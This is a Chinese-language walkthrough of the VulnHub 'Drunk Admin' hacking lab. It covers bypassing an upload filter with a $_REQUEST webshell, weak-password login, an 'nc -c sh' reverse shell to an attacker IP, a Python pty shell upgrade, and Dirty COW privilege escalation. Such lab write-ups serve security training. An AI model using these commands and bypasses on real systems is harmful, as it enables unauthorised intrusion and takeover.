# Drunk Admin Web Hacking Challenge: 1

项目地址：https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/69773821a583b567209b8820.png)

## RCE

### Upload

8880 端口就是一个文件上传，但是上传后的文件重命名了

![](https://pic1.imgdb.cn/item/69773e39a583b567209b8a66.png)

发现长度为 32 位，推测是 MD5 加密，预想的没错

![](https://pic1.imgdb.cn/item/69773eeaa583b567209b8aa0.png)

去掉后缀也能访问

![](https://pic1.imgdb.cn/item/69773f69a583b567209b8ac1.png)

直接传木马会被拦截

![](https://pic1.imgdb.cn/item/69774195a583b567209b8c9f.png)

加后缀和更改 MIME 类型也绕过不了

![](https://pic1.imgdb.cn/item/697741c0a583b567209b8db4.png)

觉得是不是上传包含 `$_POST[]` 的代码会被检测绕不过去

![](https://pic1.imgdb.cn/item/697740f1a583b567209b8b33.png)

换成 `$_REQUEST[]` 就可以

![](https://pic1.imgdb.cn/item/69774235a583b567209b90c9.png)

成功执行命令

![](https://pic1.imgdb.cn/item/6977430ba583b567209b96b7.png)

## 弱口令

看下面升级交互式部分找到一个普通用户，尝试通过 Web 访问用户 bob 主目录中托管的 Web 内容

![](https://pic1.imgdb.cn/item/697746419c48e6126bd9f492.png)

用隐藏文件尝试登录不行，最后 Base64 解密登录成功

![](https://pic1.imgdb.cn/item/697746f89c48e6126bd9f576.png)

登录成功拿到密文，应该是坐标

![](https://pic1.imgdb.cn/item/697747159c48e6126bd9f594.png)

## 提权

### nc -c 反弹 Shell

```bash
# -c 选项告诉 nc 在建立连接后，执行一个指定的命令
nc -c sh 192.168.202.128 9999
```

![](https://pic1.imgdb.cn/item/697744dba583b567209b9b7b.png)

### Python 升级为交互式 Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://pic1.imgdb.cn/item/697744e99c48e6126bd9f303.png)

翻源码看到了 WAF，果然是过滤了 `$_POST[]`

![](https://pic1.imgdb.cn/item/697745139c48e6126bd9f32e.png)

继续找到一个隐藏文件

![](https://pic1.imgdb.cn/item/697745bc9c48e6126bd9f3f0.png)

发现一个普通用户

![](https://pic1.imgdb.cn/item/697746039c48e6126bd9f442.png)

### 脏牛漏洞（CVE-2016-5195）

脚本链接：https://github.com/firefart/dirtycow/blob/master/dirty.c

服务器下载脚本编译运行

![](https://pic1.imgdb.cn/item/69774abf9c48e6126bda1b99.png)

成功提权

![](https://pic1.imgdb.cn/item/69774aa09c48e6126bda1b73.png)